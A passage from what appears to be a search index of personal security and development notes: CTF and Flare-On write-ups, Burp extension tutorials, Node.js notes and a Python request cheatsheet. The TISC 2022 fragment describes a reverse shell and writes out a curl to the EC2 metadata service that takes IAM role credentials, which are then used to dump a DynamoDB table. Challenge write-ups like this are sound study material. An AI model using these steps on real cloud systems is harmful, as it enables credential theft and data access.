Shell","text":"<ul> <li>We have our own EC2 instance already set up to wait for the incoming reverse shell triggered by the <code>init_scipt</code>.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#post-exploitation","title":"Post Exploitation","text":"<ul> <li>Then from our Reverse Shell, we can curl the URL below : </li> </ul> <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role\n</code></pre> <ul> <li>This gives us the temporary credentials to <code>ec2_agent_role</code>. </li> </ul> <ul> <li>We verify that the credentials are for ec2_agent_role with : </li> </ul> <pre><code>aws sts get-caller-identity\n</code></pre> <ul> <li>The now we start with querying the Dynamodb.</li> </ul> <pre><code>aws dynamodb list-tables --profile ec2agent\n\naws dynamodb describe-table --table-name flag_db --profile ec2agent\n\naws dynamodb scan --table-name flag_db --profile ec2agent\n</code></pre>"},{"location":"CTF/Flareon22/FlareOn_22/","title":"Flareon-22","text":""},{"location":"CTF/Flareon22/FlareOn_22/#flaredle","title":"Flaredle","text":""},{"location":"CTF/Flareon22/FlareOn_22/#challenge","title":"Challenge","text":""},{"location":"CTF/Flareon22/FlareOn_22/#process","title":"Process","text":""},{"location":"CTF/Flareon22/FlareOn_22/#understanding-game-application-logic","title":"Understanding Game / Application Logic","text":"<ul> <li>Understand what Yellow, Green and Grey means in wordle</li> <li>Green: The letter is right and in the correct position in the word.</li> <li>Yellow: The letter is correct but is in the wrong position.</li> <li>Grey: The letter is wrong and isn\u2019t in the word at all.</li> <li>We notice that in the source code file of the game there is a \"words.js\" which contains a list of valid words. These words are all small letters and a-z with no numbers or characters.</li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#python-file-to-count-occurence-of-all-characters","title":"Python file to count occurence of all Characters","text":"<p>We then wrote a python file to count the occurences of characters from A-Z in the wordlist. <pre><code>import string\n\ndef loopWordCount():\n    testtest = ''\n    for char in string.ascii_lowercase:\n        testtest += str(word.count(char)) + ','\n    return testtest\n\ndef create_counted_wordlist():\n    r_word_file = open(r'C:\\Users\\flare\\Desktop\\Script\\wordlist.txt','r')\n    w_word_file = open (r'C:\\Users\\flare\\Desktop\\Script\\counted.txt','w')\n    wordlist = r_word_file.readlines()\n    for word in wordlist :\n        #   print(word +\n        #    loopWordCount() + '\\n')    \n        w_word_file.writelines(loopWordCount())\n        w_word_file.writelines(word)\n</code></pre></p> <p>Comma-separated-value from the occurences of A-Zs. </p>"},{"location":"CTF/Flareon22/FlareOn_22/#parse-csv-into-excel-libreoffice","title":"Parse CSV into Excel / LibreOffice","text":"<ul> <li>We will now parse the csv file into excel so that we can filter with each try to finally get the correct word.</li> </ul> <ul> <li>Using this word \"AEROBACTERIOLOGICALLY\" we know that there are 1 <code>e</code>, 1 <code>i</code>, 2 <code>o</code>, 1 <code>c</code>.</li> <li>By Filtering down, we are left with these 2 words, we can filter i.e '0 <code>g</code>' and we will get <code>flareonisallaboutcats</code> </li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#flag","title":"Flag","text":"<p>There we have it the flag.  <pre><code>flareonisallaboutcats@flare-on.com\n</code></pre></p>"},{"location":"CTF/Flareon22/FlareOn_22/#pixel-poker","title":"Pixel Poker","text":""},{"location":"CTF/Flareon22/FlareOn_22/#challenge_1","title":"Challenge","text":""},{"location":"CTF/Flareon22/FlareOn_22/#process_1","title":"Process","text":""},{"location":"CTF/Flareon22/FlareOn_22/#pe-profiling-with-die","title":"PE Profiling with DiE","text":"<ul> <li>To check if application is Packed and the high level language used.</li> </ul> <ul> <li>It seems like C++ is used and executable is likely not packed.</li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#playing-around-the-application","title":"Playing Around the Application","text":"<ul> <li>We find the fail condition has some strings like \"Womp womp... :(\", \"Please play again!\"</li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#strings","title":"Strings","text":"<ul> <li> <p>Using strings (<code>shift</code> + <code>f12</code>), we find the strings that make up the fail condition </p> </li> <li> <p>Then we use the x-ref function to see location it has been referenced </p> </li> <li> <p>Then we sift out only for the function that calls it. </p> </li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#tricking-the-program-to-think-that-we-found-the-pixel","title":"Tricking the Program to think that we found the pixel","text":""},{"location":"CTF/Flareon22/FlareOn_22/#unlimited-tries","title":"Unlimited Tries","text":"<ul> <li>Then we trace back to before it is called. We see that the function does a <code>cmp 0Ah</code> where <code>0A</code> is <code>10</code>. This seems like the function to check if 10 tries has exceeded.   </li> <li>To get unlimited tries we can use a very convenient function in Cutter the \"Edit Instruction\" . </li> </ul> <ul> <li>We change the instuction from <code>jnz</code>/<code>jne</code> to <code>jmp</code>, after 10 tries, it will jump to the exit function, but go the next function.</li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#function-that-checks-for-correct-pixel-click","title":"Function that checks for correct pixel click","text":"<ul> <li>Right after the 10 tries check, there are 2 <code>jnz</code> instructions. As we are searching for pixels, I assume they are the X-axis and Y-axis.</li> </ul> <ul> <li>Again, we are back at Cutter, we use the \"reverse jump\" function to switch both of the <code>jnz</code>/<code>jne</code> instructions to <code>jz</code>/<code>je</code> instructions.</li> </ul>"},{"location":"CTF/Flareon22/FlareOn_22/#flag_1","title":"Flag","text":"<ul> <li>We open the application, and after one click, and a lag, we get the picture below. </li> </ul>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/","title":"Burp Extension - GUI","text":"<p>The appeal of writing a Burp Extension is to visualise our actions during the pentest. Therefore, the next important thing to do will be do learn how to create a GUI and interact with it before dwelling into writing the functions. We will be continuing from the Burp Extension - Hello World.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#setting-up","title":"Setting Up","text":"<p>Burp uses the Java Swing Library for the GUI hence, we will need to install this as a plugin to our Eclipse IDE.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#installing-relevant-dependencies","title":"Installing relevant dependencies","text":"<p>Step 1: Navigate to the \"Help\" tab and the \"Install New Software\" button</p> <p></p> <p>Step 2: Select the relevant site to download from. In our case we choose the first site available. </p> <p>Step 3: We then filter for \"Swing\" and \"Window\" and select everything in that filter.  </p> <p></p> <p></p> <p>After installation and restart we will be ready for the next step.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#creating-gui","title":"Creating GUI","text":"<p>In GUI creation, we will explore a the GUI feature to register a tab. </p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#register-a-tab","title":"Register a Tab","text":"<p>The following is the documentation for <code>registerSuiteTab()</code>, it seems like all we need to do is provide it with a string for the <code>title</code> and a <code>Component</code> object. </p> <p></p> <p>The following code is a simple example that will give us a \"Hello World\" Tab within it will have a <code>JLabel()</code> with \"Hello World\".  <pre><code>package TestExtension;\n\nimport javax.swing.JLabel;\n\nimport burp.api.montoya.BurpExtension;\nimport burp.api.montoya.MontoyaApi;\n\npublic class TestExtension implements BurpExtension{\n    @Override\n    public void initialize(MontoyaApi api)\n    {\n        // set extension name\n        api.extension().setName(\"Hello world extension\");\n\n        //Register a Tab\n        api.userInterface().registerSuiteTab(\"Hello World\", new JLabel(\"Hello, World!\"));\n\n        // throw an exception that will appear in our error stream\n        throw new RuntimeException(\"Hello exception.\");\n    }\n}\n</code></pre></p> <p>As can be seen below, we have registered a tab and the panel contains the Hello World Text.</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#creating-jpanel-component","title":"Creating JPanel() Component","text":"<p>But of course, we would definitely want to do more than that and we can make use of <code>JPanel()</code> for this. To do so we will first need to create a new <code>.java</code> file. It is always wise to separate the GUI <code>.java</code> from any logic <code>.java</code>. </p> <p>For the simplicity sake, we will explore just changing the appearance of the GUI and logging the changes in Extension Logs.</p> <p>Step 1: We right-click on TestExtension -&gt; New -&gt; Other, or we can simply <code>Ctrl + N</code>.</p> <p></p> <p>Step 2 : In the creation wizard, we select \"JPanel\"</p> <p></p> <p>Step 3 : We can name the <code>JPanel()</code> object however we want and in this case we will use the name <code>TestGUI</code></p> <p></p> <p>Step 4 : While it is entire possible to design the GUI with code, but to keep myself sane, I decided to use the \"Design\" feature of eclipse which can be found at the bottom left corner.</p> <p></p> <p>Step 5 : For this demonstration we used <code>GridBagLayout</code>, seen below by navigating to \"Properties\" panel and clicking onto the \"Layout\" tab.</p> <p></p> <p>Step 6 : As can be seen below, we can choose the Components to add from the Palette section and <code>GridBagLayout</code> allows us to place the Components in a grid.</p> <p></p> <p>Step 7 : After adding all the relevant labels and button, we can choose what happens when the button is clicked by right clicking on the button then \"Add event handler\" -&gt;  \"action\" -&gt; \"actionPerformed\".</p> <p></p> <p>Step 8 : We add the following action to change the text displayed when selected and logging it through the Montoya API.</p> <pre><code>//[...Truncated swing related imports...]\nimport burp.api.montoya.MontoyaApi;\nimport burp.api.montoya.logging.Logging;\n\n//[...Truncated other GUI related code...]\n\npublic TestGUI(MontoyaApi api){}\ntglbtnDisabled.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent arg0) {\n                if(tglbtnDisabled.isSelected()) {\n                    tglbtnDisabled.setText(\"Enabled\");\n                    logging.logToOutput(\"Extension Enabled\");\n                }\n                else {\n                    logging.logToOutput(\"Extension Disabled\");\n                }\n            }\n        });\n//[...Truncated other GUI related code...]\n}\n</code></pre> <p>Step 9 : We will need to update the following line in our <code>TestExtension.java</code> and we are ready to export the extension. <pre><code>api.userInterface().registerSuiteTab(HELLOW, new TestGUI(api));\n</code></pre></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#loading-the-extension","title":"Loading the Extension","text":"<p>There we have it! Our first Burp Extension that has a tab a JPanel </p> <p></p> <p>Has buttons that can be toggled On and Off</p> <p></p> <p>The On/Off actions are logged in output log.</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20GUI/#references","title":"References","text":"<ul> <li>https://systemweakness.com/writing-your-first-extension-in-burp-suite-part-2-c61622f73db3</li> <li>https://bishopfox.com/blog/power-pen-tests-with-montoya-api</li> <li>https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/ui/UserInterface.html</li> </ul>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/","title":"Burp Extension - Hello World","text":"<p>Lao Tzu once said \"A journey of a thousand miles begins with a single step\" and that single step to our journey in creating a Burp extension or any development endeavour will be the \"Hello World\"! </p> <p>In this tutorial, we will create a Hello World using the Hello World Example from Portswigger.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#setting-up","title":"Setting Up","text":"<p>We will start with environment set-up. In our set-up we will be using Eclipse as our IDE.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#install-burp","title":"Install Burp","text":"<p>In our case, we will be using Burp Community and we will follow this Burp Suite's official guide to install Burp Community.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#install-eclipse","title":"Install Eclipse","text":"<p>We then follow this guide to install eclipse but the version installed is 2023-09 (4.29.0).</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#add-external-jar","title":"Add external Jar","text":"<p>Following n3utr1n0's guide, we will need to add an external Burpsuite jar file, however there are some deviations from the guide like the use of BurpSuite Community and a newer version of Eclipse 2023-09 (4.29.0).</p> <p>After creating a new project, we can configure build path  <code>burpsuite-community.jar</code> using the following :</p> <p>Step 1: Right-click on the explorer</p> <p></p> <p>Step 2: Click on \"Classpath\" and select \"Add External JARs\"</p> <p></p> <p>Step 3 : Browse to the BurpSuite Folder and select <code>burpsuite_community.jar</code>.</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#creating-extension","title":"Creating Extension","text":"<p>After setting up we will now start creating the extension.</p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#create-package","title":"Create Package","text":"<p>Now, we go to right-click on \"src\", select \"New\" and the \"Package\" as shown below.</p> <p></p> <p>We will name the Name the same as the project name.</p> <p></p> <p>When package is created, we create a new Class as follows.</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#exporting","title":"Exporting","text":"<p>Then we can just copy and paste the Hello World example and prepare to export as jar using the following steps:</p> <p>Step 1 : Select Export</p> <p></p> <p>Step 2 : In the Export Wizard select \"JAR file\"</p> <p></p> <p>Step 3 : Select Destination</p> <p></p> <p>Step 4 : Uncheck \"Export class files with compile warnings\" then \"finish\"!</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#misc-issues-faced","title":"Misc. Issues faced","text":"<p>We might face an issue like below where the burp imports are \"not accessible\" even when we have already configured the build path to import <code>burpsuite_community.jar</code>.</p> <p></p> <p>Based on the following eclipse forum response we simply need to delete the <code>module-info.java</code> file and the error will be gone.</p> <p>Delete the module-info.java file. It's only used if you're using Java's built-in module system.</p> <p>Alternatively, when creating a project, we can uncheck create <code>module-info.java</code>.</p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#loading-extension","title":"Loading Extension","text":"<p>Firstly navigate to the \"Extensions\" tab,  then load the extension by clicking  \"Add\".</p> <p></p> <p>Browse for the <code>.jar</code> file that has been exported</p> <p></p> <p>As can be seen the extension has been loaded successfully. </p> <p></p>"},{"location":"Dev/Java/Burp%20Extension%20-%20Hello%20World/#reference","title":"Reference","text":"<ul> <li>https://n3utr1n0.medium.com/steps-to-create-burp-extension-easily-eclipse-183ca3f3c891</li> <li>https://bishopfox.com/blog/power-pen-tests-with-montoya-api</li> </ul>"},{"location":"Dev/Java/Burp%20Extension%20-%20README/","title":"Burp Extension   README","text":"<p>During Web Pentest engagements, we often face certain \"challenges\" like multi-step processes which can be automated to make things more bearable. This is where scripting comes into play. The de-facto tool for scripting is Python. However, in some cases the automation script has too many moving parts such that it feels more like a work around than an actual solution or there might be restrictions in using Python such that we are only left with our favourite tool Burpsuite.</p> <p>Burpsuite offers their Montoya API to help Pentesters like us to spice up our testing and to fully harness the power of Burpsuite being able to write our own extension will definitely offer a QOL boost to engagements!   </p> <p>However the resources to even start or learn writing the extension is sparse. Even with experience in writing code with Java and learning Java in school, I still had issues with environment set-up, issues trying to understand how to use the APIs, issues with building the GUI etc.</p> <p>The fact that Montoya API was released in 2022 did not help as this makes some resources although still relevant yet irrelevant. The <code>Burp Extension</code> series will detail my journey in building my first Java based Burp Extension using the Montoya API. The links below will be links to each step of my Journey in eventually writing a full-fletched Burp Extension.</p> <p>Burp Extension - Hello World Burp Extension - GUI</p>"},{"location":"Dev/Javascript/Node.js/","title":"Node.js","text":"<ul> <li>This is document is based on a Node.js crash course.</li> <li>Node.js is a Javascript runtime (not a language or framework) built on V8 Javascript engine written in C++.</li> <li>Node.js allows Javascript to be used as a server side language thus the language used server-side and client-side can be the same. (No need for a python,PHP webserver backend etc. all using Javascript).</li> <li>Node is not suitable for application that requires CPU intensive calculations.</li> <li>Key feature of Node.js is it's non-blocking I/O model.</li> </ul> <p>Non-blocking I/O operations allow a single process to serve multiple requests at the same time. Instead of the process being blocked and waiting for I/O operations to complete, the I/O operations are delegated to the system, so that the process can execute the next piece of code. </p> <ul> <li>Non-blocking I/O can be seen as a workaround for Javascripts inability to do multi-threading. Hence Node.js relies alot on async and non blocking I/O to support concurrent connections.</li> <li>More Sync vs Async in javascript.</li> </ul>"},{"location":"Dev/Javascript/Node.js/#nodes-event-loop","title":"Node's Event Loop","text":"<ul> <li>Below is a diagram of a Node.js thread. As can be seen below, EventEmitters fires off multiple events (processes) but the events are queued and handled in a single thread in a loop.</li> </ul> <ul> <li>More details on event loop.</li> </ul>"},{"location":"Dev/Javascript/Node.js/#npm-node-package-manager","title":"NPM (Node Package Manager)","text":"<ul> <li>Used to install 3rd party packages</li> <li>Packages are stored in \"node_modules\" folder</li> <li>Dependencies for projects are listed in \"package.json\" file</li> </ul> <pre><code># To generate a package.json file\nnpm init\n\n# To install packages locally \nnpm install &lt;package name&gt;\n\n# To install packages globally (on system)\nnpm install -g &lt;package name&gt;\n\n# To install dev dependecies in project\nnpm install --save-dev &lt;package name&gt;\nnpm install -D &lt;package name&gt;\n\n# To install dependencies that is used by a project\nnpm install\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#packagejson","title":"Package.json","text":"<ul> <li>A file created by <code>npm init</code>, where all the dependencies for the project are listed in.</li> <li>Dependencies are automatically updated in <code>Package.json</code> file.</li> <li>There are 2 types of dependencies : <code>dependencies</code> and <code>devDependencies</code>.</li> <li><code>devDependencies</code> are dependencies used only for development.</li> <li><code>package-lock.json</code> is created when npm installs a dependency and it tracks all the dependencies and its versions.</li> </ul>"},{"location":"Dev/Javascript/Node.js/#script-function","title":"Script Function","text":"<ul> <li>Below is an example of a Package.json file and within the red box is the script function.</li> </ul> <ul> <li>The script function allow us to use <code>npm</code> to run scripts enclosed within the script object denoted by their identifiers. </li> </ul> <pre><code># Syntax \nnpm run &lt;identifier&gt;\n\n# Example\nnpm run dev\nnpm run start\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#node-modules","title":"Node Modules","text":"<ul> <li>Something like libraries in other programming languages.</li> <li>3 types of modules include : Core Mods, 3rd Party Mods installed or Custom Mods</li> <li>Node uses CommonJS, ~~only ES6 method of declaring modules is not applicable.~~ (As of current version of node ES6 method of module declaration is possible. However, we will face with #set type module in the package json error.  <pre><code># how to declare\nconst module = require('path_to_module')\n</code></pre></li> </ul>"},{"location":"Dev/Javascript/Node.js/#set-type-module-in-the-packagejson-error","title":"set \"type\": \"module\" in the package.json error","text":"<ul> <li>To resolve this error we simply need to add <code>\"type\":\"module\"</code> into <code>package.json</code> as the error states an example of where to add it can be seen below.</li> </ul> <pre><code>{\n  \"name\": \"learning_ES6\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"app.js\",\n  **\"type\":\"module\"**,\n  \"author\": \"tinydev\",\n  \"license\": \"ISC\",\n}\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#sample-project","title":"Sample Project","text":"<ul> <li>Objective : With the modules introduced below, create a Webserver that serves various web pages and content (index, about, images and 404).</li> </ul>"},{"location":"Dev/Javascript/Node.js/#installing-on-debianubuntu","title":"Installing on Debian/Ubuntu","text":"<ul> <li>We can install Node and NPM on Debian/Ubuntu using apt package manager.</li> </ul> <pre><code>sudo apt install nodejs npm\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#starting-a-node-project-in-vs-code","title":"Starting a Node Project in VS Code","text":"<pre><code># Create a new VS Code Project File\nmkdir &lt;dir_name&gt;\ncd &lt;dir_name&gt; &amp;&amp; code &lt;dir_name&gt;\nctrl + shift + `\n\n# Create a new node project (In VSCode Terminal)\nnpm init\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#basic-components","title":"Basic Components","text":""},{"location":"Dev/Javascript/Node.js/#running-a-js-file-with-node","title":"Running a js file with node.","text":"<pre><code>node &lt;js_file&gt;\nnodemon &lt;js_file&gt;\n</code></pre>"},{"location":"Dev/Javascript/Node.js/#core-mod","title":"Core Mod :","text":"<ul> <li>Path</li> <li>FS-File system</li> <li>OS</li> <li>URL</li> <li>Events</li> <li>HTTP</li> </ul>"},{"location":"Dev/Javascript/Node.js/#dev-mod","title":"Dev Mod :","text":"<ul> <li>nodemon : a tool that helps develop Node.js based applications by automatically restarting the node application when file changes in the directory are detected.</li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/","title":"NodeJS Projects","text":""},{"location":"Dev/Javascript/Node.js_Projects/#simple-webpage-with-vanilla-node","title":"Simple Webpage with Vanilla Node","text":""},{"location":"Dev/Javascript/Node.js_Projects/#inefficient-webpage-implementation","title":"Inefficient Webpage implementation","text":"<ul> <li>Below is an implementation of a Node web server that will respond to requests.</li> <li>However, this implementation is not efficient and elegant as we will need to create multiple if-else cases in the server object which will clutter the code.   </li> </ul> <pre><code>//import libraries\nconst http = require('http');\nconst path = require('path');\nconst fs = require('fs');\n\n// declare port to listen on - either environment var or pre-defined\nconst PORT = process.env.port || 5000;\n\n//create server object\nconst server =http.createServer((req,res)=&gt;{\n    //basic request handling\n    if (req.url == '/'){\n        fs.readFile(path.join(__dirname,'public','hello.html'),\n        (err,content)=&gt;\n        {\n            if (err) throw err;\n            res.writeHead(200, {'Content-Type': 'text/html'});\n            res.end(content);\n        }) \n    }\n});\n\n// start server listener\nserver.listen(PORT, () =&gt; console.log(`Server running on port ${PORT}`));\n</code></pre>"},{"location":"Dev/Javascript/Node.js_Projects/#slightly-better-implementation","title":"Slightly Better Implementation","text":"<ul> <li> <p>Below is a slightly better implementation of the web server but still not the best. It can be more elegant and cleaner by more abstraction. <pre><code>//import libraries\nconst http = require('http');\nconst path = require('path');\nconst fs = require('fs');\n\n// declare port to listen on - either environment var or pre-defined\nconst PORT = process.env.port || 5000;\n\nconst server =http.createServer((req,res)=&gt;{\n    //buildFilePath\n     let filePath = path.join(\n     __dirname,\n     'public',\n     req.url === '/' ? 'hello.html' : req.url);\n\n     // Get File Extension\n     let extname = path.extname(filePath);\n\n     // Set Content-Type\n     let contentType = 'text/html';\n     //Check for ext and set Content-type\n    switch(extname){\n        case '.js':\n            contentType = 'text/javascript';\n            break;\n        case '.css':\n            contentType = 'text/css';\n            break;\n        case '.json':\n            contentType = 'application/json';\n            break;\n        case '.png':\n            contentType = 'image/png';\n            break;\n        case '.jpg':\n            contentType = 'image/jpg';\n            break;\n    }\n    //Read and serve file\n    fs.readFile(filePath,(err,content) =&gt; {        \n        if(err) {\n            //Handle 404 Error\n            if(err.code == 'ENOENT'){\n                fs.readFile(path.join(__dirname,'public','404.html'), \n                (err,content)=&gt; {\n                    res.writeHead(200, {'Content-Type': 'text/html'});\n                    res.end(content, 'utf8');\n                })\n            } \n            // Some other server errors\n            else{\n                res.writeHead(500);\n                res.end(`Server Error: ${err.code}`);\n            }\n        }\n        //Success Response if resource is found\n        else{\n            res.writeHead(200,{'Content-type':contentType});\n            res.end(content,'utf8');\n\n        }\n    });\n\n});\n\nserver.listen(PORT, () =&gt; console.log(`Server running on port ${PORT}`));\n</code></pre></p> </li> <li> <p>A simple webpage project will end here. Usually framework like ExpressJS is used to create a simple webserver and using frameworks will make the process easier and cleaner.</p> </li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/#adding-of-portswigger-academy-lab-names-to-trello-board-via-trello-rest-api-automation-with-nodejs","title":"Adding of Portswigger Academy Lab names to Trello board via Trello REST API Automation with NodeJS","text":"<ul> <li>The inspiration of this project comes from the need to automate adding of cards into trello. </li> <li>Adding of cards using the web application is too slow and repititive as we have 200 over cards name to add.</li> <li>References : <ul> <li>Official Trello REST API Documentation</li> <li>Online Guide</li> </ul> </li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/#cleaning-data-from-portswigger","title":"Cleaning Data from Portswigger","text":"<ul> <li>We looked into the HTML of the portswigger website and noticed that the title is an HTML anchor. </li> <li>Hence, with the help of curl and grep we extract only all the anchor texts that contains the lab links.</li> <li>We also noticed that all the labs will start with <code>lab-</code> in the URL.</li> </ul> <pre><code>curl https://portswigger.net/web-security/all-labs | grep 'lab-' &gt; out.txt\n</code></pre> <ul> <li>We wanted to modify the marker \"EXPERT\", \"PRACTITIONER\" and \"APPRENTICE\" to \"E\",\"P\",\"A\" respectively and still have the lab title.</li> <li>We then make use of cyberchef to get the cleaned ouput. The Cyberchef recipe is as below : </li> </ul> <pre><code>[{\"op\":\"Strip HTML tags\",\"args\":[true,true]},{\"op\":\"Find / Replace\",\"args\":[{\"option\":\"Regex\",\"string\":\"APPRENTICE\"},\"\\\\r|A|\",true,false,true,false]},{\"op\":\"Find / Replace\",\"args\":[{\"option\":\"Regex\",\"string\":\"PRACTITIONER\"},\"\\\\r|P|\",true,false,true,false]},{\"op\":\"Find / Replace\",\"args\":[{\"option\":\"Regex\",\"string\":\"EXPERT\"},\"\\\\r|E|\",true,false,true,false]},{\"op\":\"Remove whitespace\",\"args\":[false,false,true,true,true,false]}]\n</code></pre> <p>Sample output of cleaned data :</p> <p></p>"},{"location":"Dev/Javascript/Node.js_Projects/#getting-the-required-information-from-trello","title":"Getting the required Information from Trello","text":"<ul> <li>Based on the trello references above, we know that we will need four variables: <ul> <li><code>idlist</code>: ID of the list we want to add to</li> <li><code>key</code>: API Key for Trello</li> <li><code>token</code>: Server Token for Trello </li> <li><code>name</code>: Name of the card to be added </li> </ul> </li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/#nodejs-code","title":"Node.JS Code","text":"<ul> <li>The idea would be to create a <code>add_card</code> function that takes in the name to be added in a <code>function.js</code> file </li> <li>Then, using a foreach loop in <code>index.js</code> read the text file and pass the variable into the <code>add_card</code> function in the iteratively.</li> <li>The solution below will result in \"ERROR 429\"., as there is rate limiting on Atlassian end </li> <li>Ideally we will need to create a promisified <code>sleep</code> function that can be awaited. (Maybe Version 2?)</li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/#indexjs","title":"Index.js","text":"<pre><code>import { add_card,syncReadFile } from './functions.js';\n\nvar names = syncReadFile('o.txt','utf-8');\nnames.forEach(name =&gt; add_card(name));\n</code></pre>"},{"location":"Dev/Javascript/Node.js_Projects/#functionsjs","title":"functions.js","text":"<pre><code>import fetch from 'node-fetch';\n\nexport async function add_card(card_name){\n    try {\n        const response = await fetch('https://api.trello.com/1/cards?'+\n            'idList=[list_id]&amp;' +\n            'key=[API_KEY]&amp;' +\n            'token=[API_Token]&amp;' +\n            'name=' + card_name.toString(), {\n            method: 'POST',\n            headers: {\n                'Accept': 'application/json'\n            }\n        });\n        console.log(\n            `Response: ${response.status} ${response.statusText}`\n        );\n        const text = await response.text();\n        return console.log(text);\n    } catch (err) {\n        return console.error(err);\n    }\n}\n\nexport function syncReadFile(filename) {\n    const contents = readFileSync(filename, 'utf-8');\n\n    const arr = contents.split(/\\r?\\n/);\n\n    console.log(arr); \n\n    return arr;\n  }\n</code></pre>"},{"location":"Dev/Javascript/Node.js_Projects/#real-time-markdown-editor-re-make","title":"Real Time Markdown Editor (Re-make)","text":"<ul> <li>The Sample Project is a remake of this this project real-time markdown viewer from repo that teaches coding through projects. This project is a collaborative markdown editor which allows multiple users to edit and view the same markdown together in realtime.</li> <li>The old project is using vulnerable dependency (ShareJS) and redis server which in our implementation we do not want to use any of these. As such, there are some differences as compared to the original implementation.</li> <li>We will base our project on this repo which is a WYSIWYG markdown editor and build the collaboration portion from here.</li> <li>ExpressJS and EJSwill be the main dependencies used in this project.</li> </ul>"},{"location":"Dev/Javascript/Node.js_Projects/#initialising-project","title":"Initialising Project","text":"<pre><code>mkdir RTMDEditor\ncode RTMDEditor\nnpm init\nnpm install express ejs \n</code></pre> <p>{WIP}</p>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/","title":"Web Automation Cheatsheet","text":"<p>A cheatsheet inspired and based on Rizemon's Exploit Writing for OSWE. \"exploit writing\" goes beyond OSWE and what was taught is also useful in engagements especially when you need to automate the tedious stuff, hence this cheatsheet so that you can spin up a script real quick. Will add #Code Snippets for other libraries as I go along.</p> <p>Of course no matter how quick you can script, it is also worth to note the Return of Investment (ROI) of automation:</p> <p>Time saved with Automation &gt; Time spent to Code</p>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#code-snippets","title":"Code Snippets","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#useful-imports","title":"Useful Imports","text":"<pre><code># For sending HTTP requests\nimport requests\n\n# For Base64 encoding/decoding\nfrom base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode\n\n# For getting current time or for calculating time delays\nfrom time import time\n\n# For regular expressions\nimport re\n\n# For running shell commands\nimport subprocess\n\n# For running a HTTP server in the background\nimport threading\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\n# For quick creation of arguments and help menu\nimport argparse\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#requests-library","title":"<code>requests</code> Library","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#http-header","title":"HTTP Header","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#set-headers","title":"Set headers","text":"<pre><code>headers = {\n    \"X-Forwarded-For\": \"127.0.0.1\"\n}\n\nrequests.get(\"https://github.com\", headers=headers)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#set-cookies","title":"Set Cookies","text":"<pre><code>cookies = {\n    \"PHPSESSID\": \"fakesession\"\n}\n\nrequests.get(\"https://github.com\", cookies=cookies)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#requests","title":"Requests","text":"<pre><code># GET method\nrequests.get(\"https://github.com\")\n\n# POST method\nrequests.post(\"https://github.com\")\n\n# PUT method\nrequests.put(\"https://github.com\")\n\n# PATCH method\nrequests.patch(\"https://github.com\")\n\n# DELETE method\nrequests.delete(\"https://github.com\")\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#requests-thru-proxy","title":"Requests thru Proxy","text":"<pre><code>PROXY = {\n   'http':'http://127.0.0.1:8080'\n   'https':'http://127.0.0.1'\n}\nrequests.get(\"https://github.com\",proxies=PROXY)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#disable-redirect","title":"Disable Redirect","text":"<pre><code>requests.post(\"https://github.com/login\", allow_redirects=False)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#requests-body","title":"Requests Body","text":""},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#sending-data-as-a-query-string-in-the-url","title":"Sending data as a query string in the URL","text":"<pre><code>params = {\n    \"foo\": \"bar\"\n}\n\nrequests.get(\"https://github.com\", params=params)\n</code></pre>"},{"location":"Dev/Python/Web%20Automation%20Cheatsheet/#sending-data-as-a-query-string-in-the-body","title":"Sending data as a query string in the body","text":"<pre><code>data = {\n    \"foo\": \"bar\"\n}\n# sends data 